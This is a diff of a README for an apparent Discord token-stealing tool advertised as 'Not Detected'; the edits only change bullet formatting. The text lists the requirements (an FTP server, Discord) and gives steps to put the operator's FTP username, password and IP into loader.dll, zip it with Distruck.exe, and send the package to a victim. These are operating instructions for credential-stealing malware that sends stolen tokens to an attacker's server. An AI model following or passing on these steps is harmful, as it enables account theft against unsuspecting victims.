@@ -4,13 +4,13 @@ Discord Steal Token [Not Detected]
 
 REQUIREMENT
 
-*FTP SERVER
+- FTP SERVER
 
--DISCORD
+- DISCORD
 
 *HOW TO USE
 
--EDIT loader.dll WITH NOTEPAD
+- EDIT loader.dll WITH NOTEPAD
 
 INSERT YOUR FTP USERNAME ON LINE 1
 
@@ -19,7 +19,7 @@ INSERT YOUR FTP PASSWORD ON LINE 2
 INSERT YOUR FTP IP NO LINE 3
 
 
-ZIP FILE Distruck.exe & loader.dll 
+- ZIP FILE Distruck.exe & loader.dll 
 
 SENDING TO VICTIM 
 
